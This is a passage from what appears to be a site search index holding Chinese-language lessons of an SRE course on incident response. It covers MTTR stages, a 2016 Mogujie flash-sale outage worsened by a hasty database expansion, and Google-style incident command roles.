<p>\u6211\u4eec\u6309\u7167MTTR\u7684\u7ec6\u5316\u5206\u6bb5\u53ef\u4ee5\u770b\u5230\uff0c\u5904\u7406\u6545\u969c\u7684\u7b2c\u4e00\u4e2a\u73af\u8282\u5c31\u662fMTTI\uff0c\u4e5f\u5c31\u662f\u6545\u969c\u53d1\u73b0\u9636\u6bb5\u3002\u8fd9\u4e2a\u9636\u6bb5\uff0c\u6211\u4eec\u8981\u9760\u57fa\u4e8eSLO\u7684\u544a\u8b66\uff0c\u66f4\u52a0\u7cbe\u51c6\u5730\u544a\u77e5\u6211\u4eec\u5f53\u524d\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u51fa\u73b0\u7684\u95ee\u9898\uff0c\u5e76\u6839\u636e\u5bf9SLO\u7684\u5f71\u54cd\u7a0b\u5ea6\uff0c\u4e5f\u5c31\u662f\u9519\u8bef\u9884\u7b97\u7684\u6d88\u8017\u60c5\u51b5\u4f5c\u51fa\u5224\u65ad\uff0c\u662f\u5426\u5b9a\u6027\u6210\u6545\u969c\u3002\u5982\u679c\u662f\u6545\u969c\uff0c\u6211\u4eec\u5c31\u8981\u542f\u52a8\u5e94\u6025\u54cd\u5e94\uff0c\u800c\u9ad8\u6548\u5feb\u901f\u7684\u5e94\u6025\u54cd\u5e94\uff0c\u662f\u8981\u9760On-Call\u7684\u6d41\u7a0b\u673a\u5236\u6765\u4fdd\u8bc1\u7684\u3002</p> <p>\u5173\u4e8e\u5efa\u8bbeOn-Call\u7684\u6d41\u7a0b\u673a\u5236\uff0c\u6211\u7ed9\u4f60\u5206\u4eab\u4e86\u6211\u81ea\u5df1\u56e2\u961f\u7684\u201cOn-Call\u5173\u952e5\u6b65\u6cd5\u201d\uff0c\u54b1\u4eec\u518d\u4e00\u8d77\u590d\u4e60\u4e00\u4e0b\uff1a</p> <ul> <li>\u786e\u4fdd\u5173\u952e\u89d2\u8272\u5728\u7ebf\uff1b</li> <li>\u7ec4\u7ec7War Room\u5e94\u6025\u7ec4\u7ec7\uff1b</li> <li>\u5efa\u7acb\u5408\u7406\u7684\u547c\u53eb\u65b9\u5f0f\uff1b</li> <li>\u786e\u4fdd\u8d44\u6e90\u6295\u5165\u7684\u5347\u7ea7\u673a\u5236\uff1b</li> <li>\u4e0e\u4e91\u7684\u8054\u5408On-Call\u3002</li> </ul> <p>\u5f53\u6211\u4eec\u80fd\u591f\u5f88\u597d\u5730\u505a\u5230\u4ee5\u4e0a\u4e24\u70b9\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u80fd\u5927\u5e45\u964d\u4f4eMTTI\uff0c\u4e5f\u4e3a\u63a5\u4e0b\u6765\u66f4\u9ad8\u6548\u7684\u6545\u969c\u5b9a\u4f4d\u548c\u6062\u590d\u6253\u4e0b\u4e86\u575a\u5b9e\u7684\u57fa\u7840\u3002</p>"},{"location":"ops/50-sre-mogu-07/","title":"07\uff5c\u6545\u969c\u5904\u7406\uff1a\u4e00\u5207\u4ee5\u6062\u590d\u4e1a\u52a1\u4e3a\u6700\u9ad8\u4f18\u5148\u7ea7","text":"<p>\u4e0a\u4e00\u8bb2\u6211\u4eec\u8ba8\u8bba\u4e86MTTR\u7684\u7b2c\u4e00\u4e2a\u73af\u8282\uff0c\u4e5f\u5c31\u662fMTTI\uff08\u6545\u969c\u53d1\u73b0\uff09\u9636\u6bb5\u7684\u5e94\u5bf9\u63aa\u65bd\u3002\u4eca\u5929\u6211\u4eec\u7ee7\u7eed\u6765\u770bMTTR\u7684\u53e6\u5916\u4e09\u4e2a\u73af\u8282\uff0c\u4e5f\u5c31\u662fMTTK\u3001MTTF\u548cMTTV\u9636\u6bb5\uff0c\u8fd9\u4e09\u4e2a\u5bf9\u5e94\u7684\u5c31\u662f\u6545\u969c\u8bca\u65ad\u3001\u4fee\u590d\u4e0e\u786e\u8ba4\uff0c\u6211\u4eec\u4e00\u8d77\u6765\u770b\u5728\u8fd9\u4e9b\u73af\u8282\u5e94\u8be5\u505a\u597d\u54ea\u4e9b\u4e8b\u60c5\u3002</p> <p>\u4eca\u5929\u7684\u5185\u5bb9\uff0c\u6211\u4f1a\u56f4\u7ed5\u4e00\u6761\u57fa\u672c\u539f\u5219\u5c55\u5f00\uff0c\u90a3\u5c31\u662f\uff1a\u5728\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\u91c7\u53d6\u7684\u6240\u6709\u624b\u6bb5\u548c\u884c\u52a8\uff0c\u4e00\u5207\u4ee5\u6062\u590d\u4e1a\u52a1\u4e3a\u6700\u9ad8\u4f18\u5148\u7ea7\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\u7684\u552f\u4e00\u76ee\u6807\uff0c\u6ca1\u6709\u7b2c\u4e8c\u4e2a\u3002</p> <p>\u76f8\u4fe1\u4f60\u4e00\u5b9a\u7406\u89e3\u8fd9\u53e5\u8bdd\u6211\u60f3\u8981\u8868\u8fbe\u7684\u610f\u601d\uff0c\u4f46\u662f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u5f80\u5f80\u5c31\u662f\u5f88\u96be\u6267\u884c\u5230\u4f4d\u3002\u539f\u56e0\u662f\u4ec0\u4e48\u5462\uff1f</p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u6211\u5148\u5206\u4eab\u4e00\u4e2a\u6211\u81ea\u5df1\u56e2\u961f\u7684\u6848\u4f8b\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u6848\u4f8b\u975e\u5e38\u5178\u578b\uff0c\u5176\u4e2d\u66b4\u9732\u51fa\u6765\u7684\u95ee\u9898\uff0c\u4f60\u5f88\u6709\u53ef\u80fd\u4e5f\u9047\u5230\u8fc7\u3002</p> <p>\u6211\u4eec\u5148\u4e00\u8d77\u6765\u770b\u4e0b\u3002</p>"},{"location":"ops/50-sre-mogu-07/#_1","title":"\u4e00\u6b21\u5e94\u6025\u64cd\u4f5c\u5bfc\u81f4\u7684\u6545\u969c\u8513\u5ef6","text":"<p>\u57282016\u5e74\u7684\u53cc\u5341\u4e00\u524d\uff0c\u6211\u4eec\u8611\u83c7\u8857\u7b56\u5212\u4e86\u4e00\u573a\u9884\u70ed\u6d3b\u52a8\uff0c\u5404\u79cd\u4f18\u60e0\u5238\u975e\u5e38\u8bf1\u4eba\uff0c\u5f53\u65f6\u786e\u5b9e\u5438\u5f15\u4e86\u5927\u91cf\u7684\u7528\u6237\u6765\u53c2\u4e0e\u3002\u8fd9\u4e2a\u6d3b\u52a8\u662f\u79d2\u6740\u7c7b\u578b\uff0c\u77ac\u65f6\u7684\u5e76\u53d1\u91cf\u975e\u5e38\u5927\uff0c\u6211\u4eec\u5f88\u4e50\u89c2\u5730\u4ee5\u4e3a\u505a\u597d\u4e86\u5341\u8db3\u7684\u51c6\u5907\u3002</p> <p>\u7136\u800c\u771f\u5b9e\u60c5\u51b5\u662f\uff0c\u4e00\u5230\u65f6\u95f4\u70b9\u5c31\u51fa\u73b0\u4e86\u7528\u6237\u4e0b\u5355\u5931\u8d25\u95ee\u9898\u3002\u5f53\u65f6\uff0c\u6211\u4eec\u8d76\u7d27\u91c7\u53d6\u9650\u6d41\u63aa\u65bd\uff0c\u4f46\u662f\u53d1\u73b0\u4e0b\u5355\u8bf7\u6c42\u4ecd\u7136\u5927\u91cf\u963b\u585e\uff0c\u7528\u6237\u8bbf\u95ee\u8d85\u65f6\u5931\u8d25\u3002\u540e\u6765\u8fdb\u4e00\u6b65\u6392\u67e5\uff0c\u53d1\u73b0\u8bf7\u6c42\u90fd\u963b\u585e\u5728\u4e86\u4ef7\u683c\u8ba1\u7b97\u7684SQL\u8bed\u53e5\u4e0a\u3002\u8fd9\u4e2a\u4fe1\u606f\u5f88\u5feb\u4f20\u9012\u5230\u4e86DBA\u8fd9\u91cc\uff0cDBA\u5c31\u9a6c\u4e0a\u91c7\u53d6\u63aa\u65bd\uff1a\u65e2\u7136\u6709\u963b\u585e\uff0c\u90a3\u6269\u5bb9\u5c31\u662f\u6700\u5feb\u7684\u624b\u6bb5\uff0c\u5148\u5c1d\u8bd5\u4e00\u4e0b\u518d\u8bf4\uff0c\u6240\u4ee5\u9a6c\u4e0a\u505a\u4e86Slave\u8282\u70b9\u6269\u5bb9\u3002</p> <p>\u56e0\u4e3a\u5f53\u65f6\u60c5\u51b5\u7d27\u6025\uff0cDBA\u627f\u53d7\u7684\u7cbe\u795e\u538b\u529b\u4e5f\u7279\u522b\u5927\uff0c\u9057\u6f0f\u4e86\u505a\u6570\u636e\u5b8c\u6574\u6027\u548c\u4e00\u81f4\u6027\u6821\u9a8c\uff0c\u5728\u6570\u636e\u6ca1\u6709\u5b8c\u5168\u540c\u6b65\u5b8c\u6210\u7684\u60c5\u51b5\u4e0b\uff0c\u5c31\u628a\u6269\u5bb9\u8282\u70b9\u4e0a\u7ebf\u4e86\uff0c\u7ed3\u679c\u5c31\u662f\u963b\u585e\u95ee\u9898\u6709\u4e00\u5b9a\u7f13\u89e3\uff0c\u5374\u51fa\u73b0\u4e86\u8ba1\u8d39\u4ef7\u683c\u9519\u8bef\u8fd9\u79cd\u4e25\u91cd\u7684\u4e1a\u52a1\u6545\u969c\uff0c\u4e5f\u5c31\u662f\u4f18\u60e0\u5238\u7684\u4ef7\u683c\u4f18\u60e0\u6ca1\u6709\u7528\u5230\uff0c\u7528\u6237\u591a\u4ed8\u4e86\u94b1\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u7d27\u8ddf\u7740\u6211\u4eec\u5c31\u6536\u5230\u4e86\u5927\u91cf\u7684\u7528\u6237\u6295\u8bc9\u3002</p> <p>\u7ee7\u7eed\u5b9a\u4f4d\u6839\u6e90\u95ee\u9898\uff0c\u6211\u4eec\u53d1\u73b0\u7528\u6237\u7684\u8bbf\u95ee\u6a21\u578b\u8ddf\u539f\u6765\u9884\u4f30\u7684\u4e0d\u4e00\u81f4\uff0c\u5f53\u524d\u7684\u4ee3\u7801\u903b\u8f91\u65e0\u8bba\u5982\u4f55\u4e5f\u652f\u6491\u4e0d\u4f4f\u8fd9\u6837\u7684\u8bbf\u95ee\u91cf\uff0c\u552f\u4e00\u7684\u65b9\u5f0f\u5c31\u662f\u7d27\u6025\u4fee\u6539\u4ee3\u7801\uff0c\u7136\u540e\u505a\u6d4b\u8bd5\u9a8c\u8bc1\u518d\u4e0a\u7ebf\u3002\u4f46\u662f\u8fd9\u6837\u8981\u82b1\u8d39\u975e\u5e38\u957f\u7684\u65f6\u95f4\uff0c\u5b8c\u5168\u8d85\u51fa\u4e86\u6d3b\u52a8\u65f6\u95f4\uff0c\u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u4e0d\u5f97\u4e0d\u4e34\u65f6\u53d6\u6d88\u9884\u70ed\u6d3b\u52a8\uff0c\u901a\u8fc7\u7ed9\u7528\u6237\u9000\u8d39\u6216\u8865\u53d1\u4f18\u60e0\u5238\u7684\u65b9\u5f0f\u6765\u5b89\u629a\u5ba2\u6237\u3002</p> <p>\u540e\u6765\uff0c\u6211\u4eec\u590d\u76d8\u603b\u7ed3\uff0c\u8ba4\u4e3a\u8fd9\u6b21\u6545\u969c\u7684\u53d1\u751f\u548c\u6301\u7eed\u8513\u5ef6\u6709\u4e09\u4e2a\u539f\u56e0\u3002</p> <p>\u7b2c\u4e00\u4e2a\uff0c\u6545\u969c\u9694\u79bb\u624b\u6bb5\u7f3a\u5931\u3002</p> <p>\u4e4b\u6240\u4ee5\u5f15\u53d1\u8fd9\u6837\u7684\u6545\u969c\uff0c\u5176\u5b9e\u5c31\u662f\u6ca1\u6709\u63d0\u524d\u8003\u8651\u5230\u5bf9\u5e94\u7684\u6545\u969c\u9694\u79bb\u624b\u6bb5\uff0c\u6bd4\u5982\u6709\u6548\u7684\u9650\u6d41\u3001\u964d\u7ea7\u548c\u7194\u65ad\u3002\u5982\u679c\u8fd9\u4e9b\u63aa\u65bd\u4e0d\u5177\u5907\uff0c\u4ece\u6280\u672f\u5c42\u9762\u5176\u5b9e\u5df2\u7ecf\u5f88\u96be\u91c7\u53d6\u6709\u6548\u7684\u624b\u6bb5\u4e86\uff0c\u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\u5c31\u662f\uff0c\u8981\u4e48\u63d0\u524d\u7ec8\u6b62\u6d3b\u52a8\uff0c\u8981\u4e48\u7b49\u4ee3\u7801\u4f18\u5316\u5b8c\u6210\u4e0a\u7ebf\u3002</p> <p>\u56e0\u6b64\uff0c\u8fd9\u91cc\u4e1a\u52a1\u6062\u590d\u6162\uff0c\u6839\u672c\u539f\u56e0\u4e0d\u662f\u54cd\u5e94\u4e0d\u53ca\u65f6\uff0c\u5904\u7406\u6d41\u7a0b\u4e0d\u9ad8\u6548\u7b49\u7b49\uff0c\u8fd9\u4e2a\u8ddf\u5904\u7406\u8fc7\u7a0b\u5173\u7cfb\u4e0d\u5927\uff0c\u800c\u662f\u4ece\u6839\u672c\u4e0a\u5c31\u4e0d\u5177\u5907\u4e1a\u52a1\u6062\u590d\u7684\u6280\u672f\u624b\u6bb5\u3002\u6240\u4ee5\u7ed3\u5408\u4f60\u81ea\u8eab\u7684\u5de5\u4f5c\u60c5\u51b5\uff0c\u4e5f\u8981\u8fdb\u884c\u4e00\u4e2a\u53cd\u601d\uff1a\u662f\u4e0d\u662f\u4e1a\u52a1\u6a21\u578b\u8bc4\u4f30\u5f97\u4e0d\u591f\u51c6\u786e\uff1f\u5728Design-For-Failure\u7684\u9ad8\u53ef\u7528\u8bbe\u8ba1\u4e0a\u505a\u5f97\u4e0d\u591f\uff1f\u7b49\u7b49\u3002</p> <p>\u7b2c\u4e8c\uff0c\u5173\u952e\u89d2\u8272\u548c\u6d41\u7a0b\u673a\u5236\u7f3a\u5931\u3002</p> <p>\u5728\u5904\u7406\u6545\u969c\u8fc7\u7a0b\u4e2d\uff0cDBA\u53d1\u73b0SQL\u8bed\u53e5\u6267\u884c\u963b\u585e\u4e86\uff0c\u89c9\u5f97\u6269\u5bb9\u6709\u6548\uff0c\u5c31\u9a6c\u4e0a\u53bb\u505a\u4e86\uff0c\u5e76\u6ca1\u6709\u4e00\u4e2a\u5171\u540c\u51b3\u7b56\u548c\u53cd\u9988\u7684\u673a\u5236\u3002\u629b\u5f00\u6001\u5ea6\uff0c\u5355\u4ece\u7ed3\u679c\u4e0a\u8bb2\u5c31\u662f\u5fd9\u4e2d\u6dfb\u4e71\uff0c\u5bfc\u81f4\u51fa\u73b0\u66f4\u4e3a\u4e25\u91cd\u7684\u884d\u751f\u6545\u969c\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u7684\u603b\u7ed3\u5c31\u662f\uff0c\u6ca1\u6709\u6709\u6548\u7684\u6545\u969c\u5e94\u6025\u5904\u7406\u6d41\u7a0b\uff0c\u5206\u5de5\u4e0d\u660e\u786e\uff0c\u5173\u952e\u89d2\u8272\u7f3a\u5931\uff0c\u6ca1\u6709\u51b3\u7b56\u3001\u53cd\u9988\u548c\u901a\u62a5\u673a\u5236\uff0c\u5bfc\u81f4\u6574\u4e2a\u8fc7\u7a0b\u6df7\u4e71\u5931\u63a7\u3002</p> <p>\u7b2c\u4e09\uff0c\u6ca1\u6709\u6f14\u7ec3\u3002</p> <p>\u5904\u7406\u6545\u969c\u5931\u8d25\uff0c\u5bfc\u81f4\u9884\u70ed\u6d3b\u52a8\u4ee5\u5931\u8d25\u544a\u7ec8\uff0c\u5176\u5b9e\u4e5f\u662f\u56e0\u4e3a\u6211\u4eec\u7f3a\u4e4f\u6f14\u7ec3\uff0c\u5728\u9762\u5bf9\u771f\u6b63\u7684\u95ee\u9898\u65f6\uff0c\u573a\u9762\u6df7\u4e71\uff0c\u6ca1\u6709\u7ae0\u6cd5\u3002</p> <p>\u8fd9\u91cc\u6211\u8bf4\u7684\u662f\u7f3a\u5c11\u6f14\u7ec3\uff0c\u5176\u5b9e\u5728\u6211\u5b9e\u9645\u4e86\u89e3\u7684\u5f88\u591a\u6848\u4f8b\u4e2d\uff0c\u4f46\u51e1\u6545\u969c\u5904\u7406\u4e0d\u597d\u7684\uff0c\u57fa\u672c\u5c31\u662f\u6ca1\u6709\u4efb\u4f55\u6f14\u7ec3\uff0c\u8fd9\u91cc\u53c8\u5206\u4e3a\u4e24\u79cd\u3002</p> <p>\u4e00\u79cd\u662f\u6211\u4eec\u524d\u9762\u8bb2\u7684\u7b2c\u4e00\u4e2a\u539f\u56e0\uff0c\u6545\u969c\u9694\u79bb\u624b\u6bb5\u7f3a\u5931\u3002\u8981\u4e48\u7f3a\u5931\u624b\u6bb5\uff0c\u4e0d\u77e5\u4ece\u4f55\u5165\u624b\uff0c\u8981\u4e48\u5c31\u662f\u6709\u9650\u6d41\u964d\u7ea7\u7b49\u6545\u969c\u9694\u79bb\u7b56\u7565\uff0c\u4f46\u662f\u4e0d\u6562\u5c1d\u8bd5\u548c\u6f14\u7ec3\u3002\u4e3a\u4ec0\u4e48\u5462\uff1f\u5c31\u662f\u62c5\u5fc3\u6f14\u7ec3\u6709\u53ef\u80fd\u4e5f\u4f1a\u5f71\u54cd\u6b63\u5e38\u4e1a\u52a1\uff0c\u4f46\u8fd9\u4e5f\u4fa7\u9762\u8bf4\u660e\u6211\u4eec\u7684\u6280\u672f\u65b9\u6848\u4ecd\u7136\u4e0d\u591f\u6210\u719f\u548c\u5b8c\u5584\u3002\u56e0\u4e3a\u5982\u679c\u5728\u76f8\u5bf9\u6bd4\u8f83\u5bbd\u677e\u7684\u6c1b\u56f4\u4e0b\uff0c\u90fd\u4e0d\u6562\u6f14\u7ec3\u4e0d\u6562\u64cd\u4f5c\uff0c\u90a3\u771f\u6b63\u51fa\u95ee\u9898\u7684\u65f6\u5019\u5c31\u66f4\u4e0d\u6562\u4e71\u52a8\uff0c\u6216\u8005\u52a8\u4e86\u7cfb\u7edf\u4f1a\u5bfc\u81f4\u66f4\u591a\u610f\u60f3\u4e0d\u5230\u7684\u72b6\u51b5\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u5e94\u8be5\u501f\u52a9\u6f14\u7ec3\u7684\u624b\u6bb5\uff0c\u6765\u5012\u903c\u6211\u4eec\u8003\u8651\u5f97\u66f4\u5b8c\u5584\u624d\u53ef\u4ee5\u3002</p> <p>\u53e6\u4e00\u79cd\u5c31\u662f\u6574\u4e2a\u5e94\u6025\u6d41\u7a0b\u57fa\u672c\u8dd1\u4e0d\u8d77\u6765\uff0c\u8981\u4e48\u662f\u4eba\u51d1\u4e0d\u9f50\uff0c\u8981\u4e48\u662f\u5f88\u591a\u56e2\u961f\u4e0d\u613f\u610f\u914d\u5408\uff0c\u53ea\u8981\u662f\u8fd9\u79cd\u7406\u7531\u5bfc\u81f4\u7684\u65e0\u6cd5\u6f14\u7ec3\uff0c\u57fa\u672c\u51fa\u73b0\u6545\u969c\u540e\uff0c\u6574\u4e2a\u5e94\u6025\u72b6\u6001\u5c31\u662f\u5931\u63a7\u7684\u3002\u56e0\u4e3a\u5927\u5bb6\u90fd\u662f\u614c\u4e71\u72b6\u6001\uff0c\u5e73\u65f6\u90fd\u7f3a\u5c11\u914d\u5408\u548c\u534f\u4f5c\uff0c\u5728\u8fd9\u79cd\u9ad8\u538b\u72b6\u6001\u4e0b\uff0c\u5927\u5bb6\u5c31\u66f4\u987e\u4e0d\u4e0a\u6216\u8005\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u914d\u5408\u4e86\u3002</p> <p>\u8fd9\u4e48\u590d\u76d8\u4e0b\u6765\uff0c\u6545\u969c\u54cd\u5e94\u5176\u5b9e\u662f\u4e24\u4e2a\u65b9\u9762\uff0c\u6280\u672f\u65b9\u9762\u548c\u6d41\u7a0b\u673a\u5236\u65b9\u9762\u3002\u6280\u672f\u95ee\u9898\u6211\u4eec\u8fd9\u91cc\u5c31\u4e0d\u518d\u505a\u8be6\u7ec6\u4ecb\u7ecd\u4e86\uff0c\u4f60\u53ef\u4ee5\u6709\u9488\u5bf9\u6027\u5730\u770b\u4e0b\u6211\u7b2c\u4e00\u5b63\u8bfe\u7a0b\u91cc\u7684\u7b2c21\u8bb2\u300a\u6781\u7aef\u4e1a\u52a1\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u505a\u597d\u7a33\u5b9a\u6027\u4fdd\u969c\uff1f\u300b\u5185\u5bb9\u3002</p> <p>\u8fd9\u91cc\uff0c\u6211\u4eec\u91cd\u70b9\u6765\u8ba8\u8bba\u5982\u4f55\u5efa\u7acb\u6709\u6548\u7684\u6545\u969c\u5e94\u6025\u54cd\u5e94\u673a\u5236\u3002</p>"},{"location":"ops/50-sre-mogu-07/#_2","title":"\u5982\u4f55\u5efa\u7acb\u6709\u6548\u7684\u6545\u969c\u5e94\u6025\u54cd\u5e94\u673a\u5236","text":"<p>\u5173\u4e8e\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u63a5\u7740\u4e0a\u4e00\u8bb2\u7684\u5185\u5bb9\u8bf4\uff0c\u5f53\u4e00\u4e2a\u95ee\u9898\u88ab\u5b9a\u6027\u4e3a\u6545\u969c\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u8981\u6210\u7acbWar Room\uff0c\u5982\u679c\u662f\u5728\u529e\u516c\u65f6\u95f4\uff0c\u5927\u5bb6\u53ef\u4ee5\u805a\u96c6\u5230\u540c\u4e00\u4e2a\u4f1a\u8bae\u5ba4\uff0c\u6216\u8005\u540c\u4e00\u5757\u529e\u516c\u533a\u57df\u96c6\u4e2d\u5904\u7406\uff1b\u5982\u679c\u662f\u975e\u529e\u516c\u65f6\u95f4\uff0c\u53ef\u4ee5\u662f\u89c6\u9891\u3001\u7535\u8bdd\u6216\u5fae\u4fe1\u4f1a\u8bae\u7684\u65b9\u5f0f\uff0c\u5f62\u6210\u865a\u62df\u7684War Room\u3002\u4f46\u65e0\u8bba\u662f\u771f\u5b9e\u8fd8\u662f\u865a\u62df\u7684War Room\uff0c\u6839\u672c\u76ee\u7684\u662f\u5feb\u901f\u540c\u6b65\u4fe1\u606f\uff0c\u9ad8\u6548\u534f\u4f5c\u3002</p> <p>\u5728\u7279\u522b\u65f6\u671f\uff0c\u6bd4\u5982\u53cc\u5341\u4e00\u8fd9\u6837\u7684\u5927\u4fc3\u6d3b\u52a8\uff0c\u6211\u4eec\u56e2\u961f\u7684\u505a\u6cd5\u4e00\u822c\u662f\u7a7a\u51fa\u4e00\u4e2a\u697c\u5c42\uff0c\u8ba9\u6240\u6709\u53c2\u4e0e\u4fdd\u969c\u7684\u540c\u4e8b\u5750\u5728\u4e00\u4e2a\u697c\u5c42\u529e\u516c\u3002\u5728\u5df2\u7ecf\u5f62\u6210\u53cc\u5341\u4e00\u6587\u5316\u7684\u963f\u91cc\uff0c\u4ed6\u4eec\u628a\u8fd9\u6837\u7684\u529e\u516c\u5730\u70b9\u79f0\u4e3a\u201c\u5149\u660e\u9876\u201d\uff0c\u5404\u5927\u9ad8\u624b\u9f50\u805a\u4e8e\u6b64\uff0c\u5171\u540c\u4fdd\u969c\u4e1a\u52a1\u548c\u7cfb\u7edf\u7a33\u5b9a\u3002</p> <p>\u4ec5\u4ec5\u6709War Room\u8fd9\u6837\u4e00\u4e2a\u805a\u96c6\u5f62\u5f0f\u8fd8\u662f\u4e0d\u591f\u7684\uff0c\u65e2\u7136\u6211\u4eec\u628a\u89e3\u51b3\u6545\u969c\u7c7b\u6bd4\u6210\u6218\u4e89\uff0c\u6211\u4eec\u5c31\u4e00\u5b9a\u8981\u6709\u4e00\u5957\u76f8\u5bf9\u5e94\u7684\u6307\u6325\u4f53\u7cfb\u624d\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u4f53\u7cfb\u91cc\u9762\uff0c\u6211\u8ba4\u4e3a\u6700\u91cd\u8981\u7684\u5c31\u662f\u201c\u5173\u952e\u89d2\u8272\u5206\u5de5\u201d\u548c\u201c\u6c9f\u901a\u673a\u5236\u201d\u3002</p> <p>\u8fd9\u91cc\u6211\u5148\u7ed9\u4f60\u4ecb\u7ecd\u4e0bGoogle\u7684\u6307\u6325\u4f53\u7cfb\uff0c\u7136\u540e\u518d\u7ed3\u5408\u6211\u81ea\u5df1\u7684\u5b9e\u8df5\u6765\u5c55\u5f00\u3002</p>"},{"location":"ops/50-sre-mogu-07/#_3","title":"\u5173\u952e\u89d2\u8272\u5206\u5de5","text":"<p>Google\u7684\u6545\u969c\u6307\u6325\u4f53\u7cfb\uff0c\u662f\u53c2\u8003\u4e86\u7f8e\u56fd\u6d88\u9632\u5458\u5728\u5904\u74061968\u5e74\u68ee\u6797\u5927\u706b\u65f6\u5efa\u7acb\u7684\u5e94\u6025\u6307\u6325\u4f53\u7cfb\uff0c\u4f53\u7cfb\u4e2d\u6709\u4e09\u4e2a\u6838\u5fc3\u89d2\u8272\u3002</p> <p>Incident Commander\uff0c\u6545\u969c\u6307\u6325\u5b98\uff0c\u7b80\u79f0\u4e3aIC\u3002\u8fd9\u4e2a\u89d2\u8272\u662f\u6574\u4e2a\u6307\u6325\u4f53\u7cfb\u7684\u6838\u5fc3\uff0c\u4ed6\u6700\u91cd\u8981\u7684\u804c\u8d23\u662f\u7ec4\u7ec7\u548c\u534f\u8c03\uff0c\u800c\u4e0d\u662f\u6267\u884c\uff0c\u4e0b\u9762\u6240\u6709\u7684\u89d2\u8272\u90fd\u8981\u63a5\u53d7\u4ed6\u7684\u6307\u4ee4\u5e76\u4e25\u683c\u6267\u884c\u3002</p> <p>Communication Lead\uff0c\u6c9f\u901a\u5f15\u5bfc\uff0c\u7b80\u79f0CL\u3002\u8d1f\u8d23\u5bf9\u5185\u548c\u5bf9\u5916\u7684\u4fe1\u606f\u6536\u96c6\u53ca\u901a\u62a5\uff0c\u8fd9\u4e2a\u89d2\u8272\u4e00\u822c\u76f8\u5bf9\u56fa\u5b9a\uff0c\u7531\u6280\u672f\u652f\u6301\u3001QA\u6216\u8005\u662f\u67d0\u4e2aSRE\u6765\u627f\u62c5\u90fd\u53ef\u4ee5\uff0c\u4f46\u662f\u8981\u6c42\u6c9f\u901a\u8868\u8fbe\u80fd\u529b\u8981\u6bd4\u8f83\u597d\u3002</p> <p>Operations Lead\uff0c\u8fd0\u7ef4\u6307\u6325\uff0c\u7b80\u79f0OL\u3002\u8d1f\u8d23\u6307\u6325\u6216\u6307\u5bfc\u5404\u79cd\u6545\u969c\u9884\u6848\u7684\u6267\u884c\u548c\u4e1a\u52a1\u6062\u590d\u3002</p> <p>\u8fd9\u91cc\u5176\u5b9e\u8fd8\u6709\u4e00\u7c7b\u89d2\u8272\uff0c\u867d\u7136\u4e0d\u5728\u6307\u6325\u4f53\u7cfb\u5185\uff0c\u4f46\u662f\u4e5f\u975e\u5e38\u91cd\u8981\uff0c\u6211\u4eec\u4e5f\u8981\u505a\u4e00\u4e0b\u4ecb\u7ecd\uff1aIncident Responders\uff0c\u7b80\u79f0IR\u3002\u5c31\u662f\u6240\u6709\u9700\u8981\u53c2\u4e0e\u5230\u6545\u969c\u5904\u7406\u4e2d\u7684\u5404\u7c7b\u4eba\u5458\uff0c\u771f\u6b63\u7684\u6545\u969c\u5b9a\u4f4d\u548c\u4e1a\u52a1\u6062\u590d\u90fd\u662f\u4ed6\u4eec\u6765\u5b8c\u6210\u7684\uff0c\u6bd4\u5982\u5177\u4f53\u6267\u884c\u7684SRE\u3001\u7f51\u7edc\u548c\u7cfb\u7edf\u8fd0\u7ef4\u3001\u4e1a\u52a1\u5f00\u53d1\u3001\u5e73\u53f0\u5f00\u53d1\u3001\u7f51\u7edc\u6216\u7cfb\u7edf\u8fd0\u7ef4\u3001DBA\uff0c\u751a\u81f3\u662fQA\u7b49\u3002</p>"},{"location":"ops/50-sre-mogu-07/#_4","title":"\u6d41\u7a0b\u673a\u5236","text":"<p>\u5728\u6211\u81ea\u5df1\u56e2\u961f\u7684\u5177\u4f53\u5b9e\u8df5\u548c\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u6309\u8fc7\u7a0b\u6765\u5206\uff0c\u4f1a\u6709\u5982\u4e0b\u7684\u4e00\u4e2a\u6d41\u7a0b\u673a\u5236\u3002</p> <ul> <li>\u6545\u969c\u53d1\u73b0\u540e\uff0cOn-Call\u7684SRE\u6216\u8fd0\u7ef4\uff0c\u6700\u4e00\u5f00\u59cb\u5c31\u662fIC\uff0c\u6709\u6743\u53ec\u96c6\u76f8\u5e94\u7684\u4e1a\u52a1\u5f00\u53d1\u6216\u5176\u5b83\u5fc5\u8981\u8d44\u6e90\uff0c\u5feb\u901f\u7ec4\u7ec7War Room\u3002</li> <li> <p>\u5982\u679c\u95ee\u9898\u548c\u6062\u590d\u8fc7\u7a0b\u975e\u5e38\u660e\u786e\uff0cIC\u4ecd\u7136\u662fSRE\uff0c\u5c31\u4e0d\u505a\u8f6c\u79fb\uff0c\u7531\u4ed6\u6765\u6307\u6325\u6bcf\u4e2a\u4eba\u8981\u505a\u7684\u5177\u4f53\u4e8b\u60c5\uff0c\u4ee5\u4f18\u5148\u6062\u590d\u4e1a\u52a1\u4f18\u5148\u3002</p> </li> <li> 